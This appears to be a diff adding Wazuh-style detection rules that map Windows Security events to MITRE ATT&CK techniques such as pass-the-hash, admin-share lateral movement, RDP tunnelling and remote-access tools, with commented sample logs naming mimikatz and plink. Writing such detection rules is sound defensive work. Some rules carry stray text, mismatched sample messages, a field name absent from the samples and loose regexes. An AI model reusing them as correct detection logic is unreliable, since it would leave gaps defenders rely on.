@@ -1,0 +1,605 @@
+<group name="MITRE ATT&CK">
+
+<!--
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"5145","version":"0","level":"0","task":"12811","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-12-04T12:45:38.962884600Z","eventRecordID":"267092","processID":"4","threadID":"284","channel":"Security","computer":"DESKTOP-D33AN6I","severityValue":"AUDIT_SUCCESS","message":"A network share object was checked to see whether client can be granted desired access."},"eventdata":{"subjectUserSid":"S-1-5-21-2635242741-4024004514-10403589-1001","subjectUserName":"Zenidd","subjectDomainName":"DESKTOP-D33AN6I","subjectLogonId":"0x6e03e","ObjectType":"File","IpAddress":"fe80::31ea:6c3c:f40d:1973","IpPort":"56926","ShareName":"\\admin$","ShareLocalPath":"\\??\\C:\\Documents","RelativeTargetName":"5501-WKSTN1-4020-stdout","AccessMask":"0x100081","AccessList":"%%1541 %%4416 %%4423","AccessReason":"%%1541: %%1801 D:(A;;FA;;;WD) %%4416: %%1801 D:(A;;FA;;;WD) %%4423: %%1801 D:(A;;FA;;;WD)"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"5142","version":"0","level":"0","task":"12808","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-12-04T12:45:38.962884600Z","eventRecordID":"6273","processID":"4","threadID":"4","channel":"Security","computer":"DESKTOP-D33AN6I","severityValue":"AUDIT_SUCCESS","message":"Se agregó un objeto de recurso compartido de red."},"eventdata":{"subjectUserSid":"S-1-5-21-2635242741-4024004514-10403589-1001","subjectUserName":"IEUser","subjectDomainName":"DESKTOP-D33AN6I","subjectLogonId":"0x128a9","IpAddress":"fe80::31ea:6c3c:f40d:1973","ShareName":"\\*\\PRINT","ShareLocalPath":"c:\\windows\\system32"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4648","version":"0","level":"0","task":"12544","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-12-04T12:45:38.962884600Z","eventRecordID":"433350","processID":"524","threadID":"2668","channel":"Security","computer":"PC01.example.corp","severityValue":"AUDIT_SUCCESS","message":"Se intentó iniciar sesión con credenciales explícitas."},"eventdata":{"subjectUserSid":"S-1-5-21-1587066498-1489273250-1035260531-1106","subjectUserName":"user01","subjectDomainName":"EXAMPLE","subjectLogonId":"0x18a7875","LogonGuid":"{3523b8be-1c1a-a740-a8c3-4cc91a5f3b14}","TargetUserName":"administrator","TargetDomainName":"example","TargetLogonGuid":"{00000000-0000-0000-0000-000000000000}","TargetServerName":"WIN-77LTAPHIQ1R.example.corp","TargetInfo":"WIN-77LTAPHIQ1R.example.corp","ProcessId":"0x44c","ProcessName":"C:\\Windows\\System32\\wbem\\WMIC.exe","IpAddress":"-","IpPort":"-"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4648","version":"0","level":"0","task":"12544","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-12-04T12:45:38.962884600Z","eventRecordID":"433350","processID":"524","threadID":"2668","channel":"Security","computer":"PC01.example.corp","severityValue":"AUDIT_SUCCESS","message":"A logon was attempted using explicit credentials."},"eventdata":{"subjectUserSid":"S-1-5-21-1587066498-1489273250-1035260531-1106","subjectUserName":"user01","subjectDomainName":"EXAMPLE","subjectLogonId":"0x18a7875","LogonGuid":"{3523b8be-1c1a-a740-a8c3-4cc91a5f3b14}","TargetUserName":"administrator","TargetDomainName":"example","TargetLogonGuid":"{00000000-0000-0000-0000-000000000000}","TargetServerName":"WIN-77LTAPHIQ1R.example.corp","TargetInfo":"RPCSS\WIN-77LTAPHIQ1R.example.corp","ProcessId":"0x44c","ProcessName":"C:\\Windows\\System32\\wbem\\WMIC.exe","IpAddress":"-","IpPort":"-"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"5152","version":"0","level":"0","task":"13825","opcode":"0","keywords":"0x8000000000000000","systemTime":"2019-05-08T03:00:37.586173100Z","eventRecordID":"203057","processID":"444","threadID":"1224","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_FAILURE","message":"A member was added to a security-enabled local group."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","ProcessId":"4556","Application":"\\device\\harddiskvolume2\\documents\\listener.exe","Direction":"%%14592","SourceAddress":"10.0.0.100","SourcePort":"49278","DestAddress":"10.0.0.10","DestPort":"3389","Protocol":"6","FilterRTID":"0","LayerName":"%%14610","LayerRTID":"44"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4624","version":"2","level":"0","task":"12544","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-12-04T12:45:38.962884600Z","eventRecordID":"10113","processID":"620","threadID":"5596","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"Se inició sesión correctamente en una cuenta."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","subjectUserName":"IEUser","subjectDomainName":"MSEDGEWIN10","subjectLogonId":"0x2e4ce","TargetUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","TargetUserName":"IEUser","TargetDomainName":"MSEDGEWIN10","TargetLogonId":"0x38f87e","LogonType":"9","LogonProcessName":"seclogo","AuthenticationPackageName":"Negotiate","WorkstationName":"-","LogonGuid":"{00000000-0000-0000-0000-000000000000}","TransmittedServices":"-","LmPackageName":"-","KeyLength":"0","ProcessId":"0x1b90","ProcessName":"C:\\Windows\\System32\\svchost.exe","IpAddress":"::1","IpPort":"0","ImpersonationLevel":"%%1833","RestrictedAdminMode":"-","TargetOutboundUserName":"l","TargetOutboundDomainName":"o","VirtualAccount":"%%1843","TargetLinkedLogonId":"0x0","ElevatedToken":"%%1843"}}}
+
+
+-->
+<!-- LATERAL MOVEMENT -->
+<!-- Event 5145 must be enabled in agent config 
+	and even must be anbled policy setting Detailed File Share Auditing, we strongly recommend that
+-->
+<rule id="100200" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">5145</field>
+   <field name="win.eventdata.ShareName">\.*(d\$)|(admin\$)|(c\$)|(C\$)|(ipc\$)|(IPC\$)\.*</field>
+   <description>Mitre ATT&CK T1077, Lateral movement, Windows admin shares</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100201" level="7">5152
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">5142</field>
+   <description>Mitre ATT&CK T1105, Lateral movement, Remote File Copy, Net Share drive</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100202" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4648</field>
+   <field name="win.eventdata.ProcessName">C:\\Windows\\System32\\wbem\\WMIC.exe</field>
+   <description>Mitre ATT&CK T1021, Lateral movement, Remote services, WMI Remote Access</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100203" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4648</field>
+   <field name="win.eventdata.TargetInfo">(\.*)RPCSS(\.*)</field>
+   <description>Mitre ATT&CK T1077, Lateral movement, Windows admin shares, Remote Procedure Calls (RPCs)</description>
+   <options>no_full_log</options>
+</rule>
+<!-- Possibly noisy rule-->
+<rule id="100204" level="7">
+   <if_sid>60104</if_sid>
+   <field name="win.system.eventID">5152</field>
+   <field name="win.eventdata.DestPort">3389|445</field>
+   <description>Mitre ATT&CK T1021, Lateral movement, Remote Services, Blocked Inbound packets to known Lateral Movement Ports</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100205" level="7">
+   <if_sid>60106</if_sid>
+   <field name="win.system.eventID">4624</field>
+   <field name="win.eventdata.LogonType">9</field>
+   <field name="win.eventdata.AuthenticationPackageName">Negotiate</field>
+   <field name="win.eventdata.LogonProcessName">seclogo</field>
+   <description>Mitre ATT&CK T1075, Lateral movement, Pass the Hash</description>
+   <options>no_full_log</options>
+</rule>
+<!--
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4624","version":"2","level":"0","task":"12544","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-12-04T12:45:38.962884600Z","eventRecordID":"10113","processID":"620","threadID":"5596","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"Se inició sesión correctamente en una cuenta."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","subjectUserName":"IEUser","subjectDomainName":"MSEDGEWIN10","subjectLogonId":"0x2e4ce","TargetUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","TargetUserName":"IEUser","TargetDomainName":"MSEDGEWIN10","TargetLogonId":"0x38f87e","LogonType":"9","LogonProcessName":"User32","AuthenticationPackageName":"Negotiate","WorkstationName":"-","LogonGuid":"{00000000-0000-0000-0000-000000000000}","TransmittedServices":"-","LmPackageName":"-","KeyLength":"0","ProcessId":"0x1b90","ProcessName":"C:\\Windows\\System32\\svchost.exe","IpAddress":"::1","IpPort":"0","ImpersonationLevel":"%%1833","RestrictedAdminMode":"-","TargetOutboundUserName":"l","TargetOutboundDomainName":"o","VirtualAccount":"%%1843","TargetLinkedLogonId":"0x0","ElevatedToken":"%%1843"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4624","version":"2","level":"0","task":"12544","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-12-04T12:45:38.962884600Z","eventRecordID":"10113","processID":"620","threadID":"5596","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"Se inició sesión correctamente en una cuenta."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","subjectUserName":"-","subjectDomainName":"-","subjectLogonId":"0x0","TargetUserSid":"S-1-5-7","TargetUserName":"ANONYMOUS LOGON","TargetDomainName":"NT AUTHORITY","TargetLogonId":"0x1d12916","LogonType":"3","LogonProcessName":"NtLmSsp","AuthenticationPackageName":"NTLM","WorkstationName":"-","LogonGuid":"{00000000-0000-0000-0000-000000000000}","TransmittedServices":"-","LmPackageName":"NTLM V1","KeyLength":"128","ProcessId":"0x0","ProcessName":"-","IpAddress":"127.0.0.1","IpPort":"59336","ImpersonationLevel":"%%1833"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4703","version":"0","level":"0","task":"13317","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-12-04T12:45:38.962884600Z","eventRecordID":"11983","processID":"4","threadID":"248","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"Se inició sesión correctamente en una cuenta."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","subjectUserName":"IEUser","subjectDomainName":"MSEDGEWIN10","subjectLogonId":"0x342ba","TargetUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","TargetUserName":"IEUser","TargetDomainName":"MSEDGEWIN10","TargetLogonId":"0x342ba","ProcessName":"C:\\Users\\IEUser\\Desktop\\x64\\mimikatz.exe","ProcessId":"0x8fc","EnabledPrivilegeList":"SeDebugPrivilege","DisabledPrivilegeList":"-"}}}
+-->
+<!-- PRIVILEGE ESCALATION -->
+
+<rule id="100220" level="10">
+   <if_sid>60106</if_sid>
+   <field name="win.system.eventID">4624</field>
+   <field name="win.eventdata.LogonType">9</field>
+   <description>Mitre ATT&CK T1134, Privilege Escalation, Access Token Manipulation, UAC Token Duplication</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100221" level="10">
+   <if_sid>60106</if_sid>
+   <field name="win.system.eventID">4624</field>
+   <field name="win.eventdata.LogonType">3</field>
+   <field name="win.eventdata.TargetUserName">ANONYMOUS LOGON</field>
+   <field name="win.eventdata.TargetUserSid">S-1-5-7</field>
+   <field name="win.eventdata.IpAddress">127.0.0.1</field>
+   <description>Mitre ATT&CK T1134, Privilege Escalation, Access Token Manipulation, Juicy Potatoe</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100222" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4703</field>
+   <field name="win.eventdata.EnabledPrivilegeList">SeDebugPrivilege</field>
+   <description>Mitre ATT&CK T1134, Privilege Escalation, Access Token Manipulation, SeDebugPrivilege Enabled</description>
+   <options>no_full_log</options>
+</rule>
+
+
+<!--
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4624","version":"0","level":"0","task":"12544","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-12-04T12:45:38.962884600Z","eventRecordID":"5315","processID":"480","threadID":"395","channel":"Security","computer":"PC02.example.corp","severityValue":"AUDIT_SUCCESS","message":"Se inició sesión correctamente en una cuenta."},"eventdata":{"subjectUserSid":"S-1-5-18","SubjectUserName":"PC02$","SubjectDomainName":"EXAMPLE","SubjectLogonId":"0x3e7","TargetUserSid":"2S-1-5-21-3583694148-1414552638-2922671848-1000","TargetUserName":"IEUser","TargetDomainName":"PC02","TargetLogonId":"0x45120","LogonType":"10","LogonProcessName":"User32","AuthenticationPackageName":"Negotiate","WorkstationName":"PC02","LogonGuid":"{00000000-0000-0000-0000-000000000000}","TransmittedServices":"-","LmPackageName":"-","KeyLength":"0","ProcessId":"0x658","ProcessName":"C:\\Windows\\System32\\winlogon.exe","IpAddress":"127.0.0.1","IpPort":"49164"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"5156","version":"1","level":"0","task":"12810","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-02-13T18:04:01.632120800Z","eventRecordID":"227727","processID":"4","threadID":"56","channel":"Security","computer":"PC01.example.corp","severityValue":"AUDIT_SUCCESS","message":"The Windows Filtering Platform has permitted a connection."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","ProcessID":"3324","Application":"\\device\\harddiskvolume1\\users\\user01\\desktop\\plink.exe","Direction":"%%14593","SourceAddress":"127.0.0.1","SourcePort":"49271","DestAddress":"127.0.0.2","DestPort":"3389","Protocol":"6","FilterRTID":"0","LayerName":"%%14611","LayerRTID":"48","RemoteUserID":"S-1-0-0","RemoteMachineID":"S-1-0-0" }}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"5156","version":"0","level":"0","task":"13826","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-08-05T09:25:03.867961600Z","eventRecordID":"10091","processID":"620","threadID":"1948","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"The Windows Filtering Platform has permitted a connection."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","ProcessID":"4556","Application":"\\device\\harddiskvolume2\\documents\\listener.exe","Direction":"%%14592","SourceAddress":"127.0.0.1","SourcePort":"3333","DestAddress":"10.0.0.100","DestPort":"6667","Protocol":"6","FilterRTID":"70201","LayerName":"%%14610","LayerRTID":"44","RemoteUserID":"S-1-0-0","RemoteMachineID":"S-1-0-0"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"5158","version":"0","level":"0","task":"13826","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-08-05T09:25:03.867961600Z","eventRecordID":"10091","processID":"620","threadID":"1948","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"The Windows Filtering Platform has permitted a bind to a local port."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","ProcessId":"4556","Application":"\\device\\harddiskvolume2\\documents\\listener.exe","SourceAddress":"0.0.0.0","SourcePort":"5800","Protocol":"6","FilterRTID":"0","LayerName":"%%14608","LayerRTID":"36" }}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"5156","version":"0","level":"0","task":"13826","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-08-05T09:25:03.867961600Z","eventRecordID":"10091","processID":"620","threadID":"1948","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"The Windows Filtering Platform has permitted a connection."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","ProcessID":"4556","Application":"\\device\\harddiskvolume2\\documents\\listener.exe","Direction":"%%14592","SourceAddress":"127.0.0.1","SourcePort":"3333","DestAddress":"10.0.0.100","DestPort":"5938","Protocol":"6","FilterRTID":"70201","LayerName":"%%14610","LayerRTID":"44","RemoteUserID":"S-1-0-0","RemoteMachineID":"S-1-0-0"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"5156","version":"0","level":"0","task":"13826","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-08-05T09:25:03.867961600Z","eventRecordID":"10091","processID":"620","threadID":"1948","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"The Windows Filtering Platform has permitted a connection."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","ProcessID":"4556","Application":"\\device\\harddiskvolume2\\documents\\listener.exe","Direction":"%%14592","SourceAddress":"127.0.0.1","SourcePort":"3333","DestAddress":"10.0.0.100","DestPort":"8200","Protocol":"6","FilterRTID":"70201","LayerName":"%%14610","LayerRTID":"44","RemoteUserID":"S-1-0-0","RemoteMachineID":"S-1-0-0"}}}
+-->
+<!-- COMMAND AND CONTROL -->
+
+<rule id="100240" level="10">
+   <if_sid>60106</if_sid>
+   <field name="win.system.eventID">4624</field>
+   <field name="win.eventdata.LogonType">10</field>
+   <field name="win.eventdata.IpAddress">127.0.0.1</field>
+   <description>Mitre ATT&CK T1090, Command and Control, Connection Proxy, RDP Tunneling via SSH</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100241" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">5156</field>
+   <field name="win.eventdata.DestPort">3389</field>
+   <field name="win.eventdata.SourceAddress">127.0.0.1</field>
+   <description>Mitre ATT&CK T1090, Command and Control, Connection Proxy, RDP Tunneling via SSH</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100242" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">5156</field>
+   <field name="win.eventdata.DestPort">6667</field>
+   <description>Mitre ATT&CK T1219, Command and Control, Remote Access Tools, IRC Traffic</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100243" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">5158</field>
+   <field name="win.eventdata.SourcePort">5800|5900</field>
+   <description>Mitre ATT&CK T1219, Command and Control, Remote Access Tools, VNC Traffic</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100244" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">5156</field>
+   <field name="win.eventdata.DestPort">5938</field>
+   <description>Mitre ATT&CK T1219, Command and Control, Remote Access Tools, Teamviewer Traffic</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100245" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">5156</field>
+   <field name="win.eventdata.DestPort">8200</field>
+   <description>Mitre ATT&CK T1219, Command and Control, Remote Access Tools, Go2assist/LogMeIn Traffic</description>
+   <options>no_full_log</options>
+</rule>
+
+<!--
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4799","version":"0","level":"0","task":"13826","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-08-05T09:25:03.867961600Z","eventRecordID":"10091","processID":"620","threadID":"1948","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"Se enumeró la pertenencia a grupos locales con seguridad habilitada."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","TargetUserName":"Administrators","TargetDomainName":"Builtin","TargetSid":"S-1-5-32-544","SubjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserName":"IEUser","SubjectDomainName":"MSEDGEWIN10","SubjectLogonId":"0x2e47a","CallerProcessId":"0x5c0","CallerProcessName":"C:\\Windows\\System32\\net1.exe"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4661","version":"0","level":"0","task":"14080","opcode":"0","keywords":"0x8020000000000000","systemTime":"2015-09-30T00:11:56.547696700Z","eventRecordID":"1048009","processID":"520","threadID":"528","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":"A handle to an object was requested."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-21-3457937927-2839227994-823803824-1104","SubjectUserName":"dadmin","SubjectDomainName":"CONTOSO","SubjectLogonId":"0x4280e","ObjectServer":"Security Account Manager","ObjectType":"SAM\\_DOMAIN","ObjectName":"DC=contoso,DC=local","HandleId":"0xdd64d36870","TransactionId":"{00000000-0000-0000-0000-000000000000}","AccessList":"%%5400","AccessMask":"0x2d","PrivilegeList":"Ā","Properties":"-","RestrictedSidCount":"2949165","ProcessId":"0x9000a000d002d","ProcessName":"{bf967a90-0de6-11d0-a285-00aa003049e2} %%5400 {ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501}"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4661","version":"0","level":"0","task":"14080","opcode":"0","keywords":"0x8020000000000000","systemTime":"2015-09-30T00:11:56.547696700Z","eventRecordID":"1048009","processID":"520","threadID":"528","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":"A handle to an object was requested."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-21-3457937927-2839227994-823803824-1104","SubjectUserName":"dadmin$","SubjectDomainName":"CONTOSO","SubjectLogonId":"0x4280e","ObjectServer":"Security Account Manager","ObjectType":"SAM\\_DOMAIN","ObjectName":"S-1-5-21-1587066498-1489273250-1035260531-512","HandleId":"0xdd64d36870","TransactionId":"{00000000-0000-0000-0000-000000000000}","AccessList":"%%5400","AccessMask":"0x2d","PrivilegeList":"Ā","Properties":"-","RestrictedSidCount":"2949165","ProcessId":"0x9000a000d002d","ProcessName":"{bf967a90-0de6-11d0-a285-00aa003049e2} %%5400 {ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501}"}}}
+
+-->
+<!-- DISCOVERY -->
+
+<rule id="100260" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4799</field>
+   <description>Mitre ATT&CK T1087, Discovery, Account Discovery, A security-enabled local group membership was enumerated</description>
+   <options>no_full_log</options>
+</rule>
+<!-- Due to the noisiness of the 4661 event it's recommended to enable it only if you need detailed auditing for SAM database object operations -->
+<rule id="100261" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4661</field>
+   <field name="win.eventdata.SourceUserName">(\.*)\$</field>
+   <field name="win.eventdata.ObjectName">(\.*)S-1-5-21-(\.*)-512|502|500|505|519|520|544|551|555(\.*)</field>
+   <description>Mitre ATT&CK T1087, Discovery, Account Discovery, A handle to an object was requested, Audit SAM</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100262" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4661</field>
+   <field name="win.eventdata.ObjectType">(\.*)SAM(\.*)</field> 
+   <description>Mitre ATT&CK T1087, Discovery, Account Discovery, A handle to an object was requested, known privileged AD accounts/groups enumeration</description>
+   <options>no_full_log</options>
+</rule>
+
+
+
+
+<!--
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4928","version":"0","level":"0","task":"14083","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-08-05T09:25:03.867961600Z","eventRecordID":"10091","processID":"524","threadID":"1948","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"An Active Directory replica source naming context was established."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","DestinationDRA":"CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=contoso,DC=local","SourceDRA":"CN=NTDS Settings,CN=WIN2012R2,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=contoso,DC=local","SourceAddr":"ddec0cff-6ceb-4a59-b13f-1724c38a0970.\\_msdcs.contoso.local","NamingContext":"DC=ForestDnsZones,DC=contoso,DC=local","Options":"368","StatusCode":"0"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"1102","version":"0","level":"4","task":"104","opcode":"0","keywords":"0x4020000000000000","systemTime":"2019-08-05T09:25:03.867961600Z","eventRecordID":"452811","processID":"524","threadID":"1948","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"Se borró el registro de auditoría."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"104","version":"0","level":"4","task":"104","opcode":"0","keywords":"0x4020000000000000","systemTime":"2019-08-05T09:25:03.867961600Z","eventRecordID":"452811","processID":"524","threadID":"1948","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"Se borró el registro de auditoría."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4742","version":"0","level":"0","task":"13825","opcode":"0","keywords":"0x8000000000000000","systemTime":"2019-05-08T03:00:37.586173100Z","eventRecordID":"203057","processID":"444","threadID":"1224","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":"A computer account was changed."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SamAccountName":"-","DisplayName":"-","UserPrincipalName":"-","HomeDirectory":"-","HomePath":"-","ScriptPath":"-","ProfilePath":"-","UserWorkstations":"-","PasswordLastSet":"-","AccountExpires":"-","PrimaryGroupId":"-","AllowedToDelegateTo":"-","OldUacValue":"-","NewUacValue":"-","UserAccountControl":"-","UserParameters":"-","SidHistory":"-","LogonHours":"-","DnsHostName":"-","ServicePrincipalNames":"-"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4826","version":"1","level":"0","task":"12288","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-04-27T19:33:50.134293600Z","eventRecordID":"1101699","processID":"520","threadID":"1508","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":"Boot Configuration Data loaded."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-18","SubjectUserName":"-","SubjectDomainName":"-","SubjectLogonId":"0x3e7","LoadOptions":"-","AdvancedOptions":"%%1843","ConfigAccessPolicy":"%%1846","RemoteEventLogging":"%%1843","KernelDebug":"%%1843","VsmLaunchType":"%%1848","TestSigning":"%%1843","FlightSigning":"%%1843","DisableIntegrityChecks":"%%1842","HypervisorLoadOptions":"-","HypervisorLaunchType":"%%1848","HypervisorDebug":"%%1843"}}}
+
